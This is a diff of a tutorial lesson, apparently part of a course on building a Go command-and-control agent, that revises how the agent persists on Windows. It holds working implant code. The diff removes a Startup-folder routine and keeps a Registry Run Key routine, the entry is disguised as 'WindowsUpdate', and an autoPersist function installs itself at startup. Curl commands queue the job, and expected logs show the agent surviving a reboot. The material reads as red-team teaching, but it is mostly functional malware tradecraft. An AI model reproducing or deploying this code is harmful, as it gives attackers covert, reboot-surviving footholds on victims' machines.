@@ -22,10 +22,7 @@ After completing this lesson, you can:
 
 This is what takes a proof-of-concept to a real operational capability.
 
-We'll implement two persistence mechanisms:
-
-- **Registry Run Key** (HKCU\Software\Microsoft\Windows\CurrentVersion\Run)
-- **Startup Folder** (as an alternative)
+We'll implement persistence via the **Registry Run Key** (`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`).
 
 ## What We'll Create
 
@@ -33,7 +30,6 @@ We'll implement two persistence mechanisms:
 - `validatePersistCommand` and `processPersistCommand` functions
 - `orchestratePersist` on the agent
 - `doPersist` with Windows-specific implementation
-- Platform stubs for non-Windows systems
 
 ## Understanding Persistence Mechanisms
 
@@ -44,7 +40,7 @@ Before we code, let's understand Windows persistence options:
 - Runs at user login (no admin required)
 - Survives reboots
 
-**2. Startup Folder (Alternative we'll implement)**
+**2. Startup Folder**
 - `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`
 - Runs at user login
 - Easy to spot (visible in Explorer)
@@ -68,14 +64,12 @@ Add to `control/models.go`:
 ```go
 // PersistArgsClient - what the client sends
 type PersistArgsClient struct {
-	Method   string `json:"method"`    // "registry" or "startup"
 	Name     string `json:"name"`      // Name for the persistence entry
 	Remove   bool   `json:"remove"`    // true to remove persistence, false to install
 }
 
 // PersistArgsAgent - what we send to the agent
 type PersistArgsAgent struct {
-	Method   string `json:"method"`
 	Name     string `json:"name"`
 	Remove   bool   `json:"remove"`
 	AgentPath string `json:"agent_path"` // Path where agent executable is located
@@ -84,8 +78,7 @@ type PersistArgsAgent struct {
 
 **Understanding the fields:**
 
-- **Method** - Which persistence mechanism to use
-- **Name** - Display name in registry/startup folder
+- **Name** - Display name in the registry entry
 - **Remove** - Allows removing persistence (cleanup)
 - **AgentPath** - The agent needs to know its own location
 
@@ -129,22 +122,13 @@ func validatePersistCommand(rawArgs json.RawMessage) error {
 		return fmt.Errorf("invalid argument format: %w", err)
 	}
 
-	// Validate method
-	validMethods := map[string]bool{
-		"registry": true,
-		"startup":  true,
-	}
-	if !validMethods[args.Method] {
-		return fmt.Errorf("invalid method '%s' (valid: registry, startup)", args.Method)
-	}
-
 	// Name is required
 	if args.Name == "" {
 		return fmt.Errorf("name is required")
 	}
 
-	log.Printf("Persist validation passed: method=%s, name=%s, remove=%v",
-		args.Method, args.Name, args.Remove)
+	log.Printf("Persist validation passed: name=%s, remove=%v",
+		args.Name, args.Remove)
 	return nil
 }
 ```
@@ -164,7 +148,6 @@ func processPersistCommand(rawArgs json.RawMessage) (json.RawMessage, error) {
 
 	// Pass through to agent - it knows its own executable path
 	agentArgs := models.PersistArgsAgent{
-		Method:    clientArgs.Method,
 		Name:      clientArgs.Name,
 		Remove:    clientArgs.Remove,
 		AgentPath: "", // Agent will fill this in
@@ -179,8 +162,8 @@ func processPersistCommand(rawArgs json.RawMessage) (json.RawMessage, error) {
 	if clientArgs.Remove {
 		action = "remove"
 	}
-	log.Printf("Persist processed: %s persistence via %s (name: %s)",
-		action, clientArgs.Method, clientArgs.Name)
+	log.Printf("Persist processed: %s persistence (name: %s)",
+		action, clientArgs.Name)
 	return processedJSON, nil
 }
 ```
@@ -194,7 +177,6 @@ Add to `models/results.go`:
 ```go
 // PersistResult - what the agent sends back
 type PersistResult struct {
-	Method   string `json:"method"`
 	Success  bool   `json:"success"`
 	Message  string `json:"message"`
 }
@@ -224,8 +206,8 @@ func (agent *HTTPSAgent) orchestratePersist(job *server.HTTPSResponse) AgentTask
 	if persistArgs.Remove {
 		action = "Removing"
 	}
-	log.Printf("|PERSIST ORCHESTRATOR| Task ID: %s. %s persistence via %s",
-		job.JobID, action, persistArgs.Method)
+	log.Printf("|PERSIST ORCHESTRATOR| Task ID: %s. %s persistence",
+		job.JobID, action)
 
 	// Get our own executable path
 	execPath, err := os.Executable()
@@ -283,29 +265,9 @@ const (
 	runKeyPath = `Software\Microsoft\Windows\CurrentVersion\Run`
 )
 
-// doPersist performs the persistence operation on Windows
+// doPersist handles Registry Run Key persistence on Windows
 func doPersist(args models.PersistArgsAgent) models.PersistResult {
-	result := models.PersistResult{
-		Method: args.Method,
-	}
-
-	switch args.Method {
-	case "registry":
-		return doPersistRegistry(args)
-	case "startup":
-		return doPersistStartup(args)
-	default:
-		result.Success = false
-		result.Message = fmt.Sprintf("unknown method: %s", args.Method)
-		return result
-	}
-}
-
-// doPersistRegistry handles Registry Run Key persistence
-func doPersistRegistry(args models.PersistArgsAgent) models.PersistResult {
-	result := models.PersistResult{
-		Method: "registry",
-	}
+	result := models.PersistResult{}
 
 	// Open the Run key
 	key, err := registry.OpenKey(registry.CURRENT_USER, runKeyPath, registry.SET_VALUE|registry.QUERY_VALUE)
@@ -340,62 +302,6 @@ func doPersistRegistry(args models.PersistArgsAgent) models.PersistResult {
 
 	return result
 }
-
-// doPersistStartup handles Startup Folder persistence
-func doPersistStartup(args models.PersistArgsAgent) models.PersistResult {
-	result := models.PersistResult{
-		Method: "startup",
-	}
-
-	// Get the Startup folder path
-	appData := os.Getenv("APPDATA")
-	if appData == "" {
-		result.Success = false
-		result.Message = "APPDATA environment variable not set"
-		return result
-	}
-	startupPath := filepath.Join(appData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
-
-	// Create executable filename (we copy the exe, not a shortcut)
-	exePath := filepath.Join(startupPath, args.Name+".exe")
-
-	if args.Remove {
-		// Remove the executable
-		err := os.Remove(exePath)
-		if err != nil {
-			result.Success = false
-			result.Message = fmt.Sprintf("failed to remove startup executable: %v", err)
-			return result
-		}
-		result.Success = true
-		result.Message = fmt.Sprintf("Removed startup executable '%s'", args.Name)
-	} else {
-		// For simplicity, we'll copy the executable instead of creating a shortcut
-		// Creating proper .lnk files requires COM or external tools
-		copyPath := filepath.Join(startupPath, args.Name+".exe")
-
-		// Read original file
-		data, err := os.ReadFile(args.AgentPath)
-		if err != nil {
-			result.Success = false
-			result.Message = fmt.Sprintf("failed to read agent: %v", err)
-			return result
-		}
-
-		// Write to startup folder
-		err = os.WriteFile(copyPath, data, 0755)
-		if err != nil {
-			result.Success = false
-			result.Message = fmt.Sprintf("failed to copy to startup folder: %v", err)
-			return result
-		}
-
-		result.Success = true
-		result.Message = fmt.Sprintf("Copied agent to startup folder: %s", copyPath)
-	}
-
-	return result
-}
 ```
 
 ### Breaking Down the Registry Persistence
@@ -420,25 +326,6 @@ This adds an entry like:
 
 Now when the user logs in, Windows will automatically run our agent!
 
-### Create Non-Windows Stub
-
-Create `agent/persist_other.go`:
-
-```go
-//go:build !windows
-
-// doPersist stub for non-Windows systems
-func doPersist(args models.PersistArgsAgent) models.PersistResult {
-	return models.PersistResult{
-		Method:  args.Method,
-		Success: false,
-		Message: fmt.Sprintf("Persistence not implemented for this platform (requested: %s)", args.Method),
-	}
-}
-```
-
-This allows the code to compile on macOS/Linux for development, even though persistence only works on Windows.
-
 ### Register the Orchestrator
 
 Update `registerCommands()` in `agent/commands.go`:
@@ -457,7 +344,7 @@ You might notice that unlike shellcode (which required an interface in `internal
 
 **Shellcode**: The doers live in a separate package (`internals/shellcode/`). When code in the `agent` package needs to call into a different package, an interface provides the contract.
 
-**Persist**: All files are in the **same** `agent` package - `persist.go`, `persist_windows.go`, and `persist_other.go`. Go's build tags work at compile time: when you build for Windows, only `persist_windows.go` is included. When you build for Mac/Linux, only `persist_other.go` is included. Since both define the same `doPersist()` function and only one is ever compiled, no interface is needed.
+**Persist**: All files are in the **same** `agent` package - `persist.go` and `persist_windows.go`. Go's build tags work at compile time: when you build for Windows, `persist_windows.go` is included. Since everything is in the same package and the doer is called directly, no interface is needed.
 
 **Rule of thumb**: Same package + build tags = no interface. Different packages = interface needed.
 
@@ -490,15 +377,15 @@ go run ./cmd/server
 **Step 5: Queue the persistence command**
 
 ```bash
-curl -X POST http://localhost:8080/command -d '{"command": "persist", "data": {"method": "registry", "name": "WindowsUpdate", "remove": false}}'
+curl -X POST http://localhost:8080/command -d '{"command": "persist", "data": {"name": "WindowsUpdate", "remove": false}}'
 ```
 
 **Expected server output:**
 
 ```bash
 2025/11/08 15:30:22 Received command: persist
-2025/11/08 15:30:22 Persist validation passed: method=registry, name=WindowsUpdate, remove=false
-2025/11/08 15:30:22 Persist processed: install persistence via registry (name: WindowsUpdate)
+2025/11/08 15:30:22 Persist validation passed: name=WindowsUpdate, remove=false
+2025/11/08 15:30:22 Persist processed: install persistence (name: WindowsUpdate)
 2025/11/08 15:30:22 QUEUED: persist
 2025/11/08 15:30:25 DEQUEUED: Command 'persist'
 2025/11/08 15:30:25 Job (ID: job_789123) has succeeded
@@ -529,7 +416,7 @@ Your agent survived a reboot.
 **Step 8: Remove persistence (cleanup)**
 
 ```bash
-curl -X POST http://localhost:8080/command -d '{"command": "persist", "data": {"method": "registry", "name": "WindowsUpdate", "remove": true}}'
+curl -X POST http://localhost:8080/command -d '{"command": "persist", "data": {"name": "WindowsUpdate", "remove": true}}'
 ```
 
 ## Taking It Further: Automated Persistence
@@ -543,27 +430,15 @@ In practice, you'd often want **automatic persistence** - the agent installs its
 ```go
 // autoPersist attempts to install persistence automatically on startup
 func autoPersist() error {
-    // Try registry first
     result := doPersist(control.PersistArgsAgent{
-        Method: "registry",
-        Name:   "WindowsUpdate",
+        Name:      "WindowsUpdate",
         AgentPath: getExecutablePath(),
     })
     if result.Success {
         return nil
     }
 
-    // Fall back to startup folder
-    result = doPersist(control.PersistArgsAgent{
-        Method: "startup",
-        Name:   "WindowsUpdate",
-        AgentPath: getExecutablePath(),
-    })
-    if result.Success {
-        return nil
-    }
-
-    return errors.New("all persistence methods failed")
+    return errors.New("persistence failed: " + result.Message)
 }
 ```
 
@@ -583,7 +458,7 @@ func main() {
 }
 ```
 
-This gives you the best of both worlds: automatic persistence with fallback, while still keeping the manual command for testing and cleanup.
+This gives you the best of both worlds: automatic persistence on startup, while still keeping the manual command for testing and cleanup.
 
 ## Conclusion
 
@@ -591,7 +466,7 @@ In this final lesson, we implemented persistence:
 
 - Created argument types for the persist command
 - Implemented server-side validation and processing
-- Created Windows-specific Registry and Startup folder persistence
+- Created Windows-specific Registry Run Key persistence
 - Tested the complete flow including reboot survival
 - Cleaned up with the remove option
 
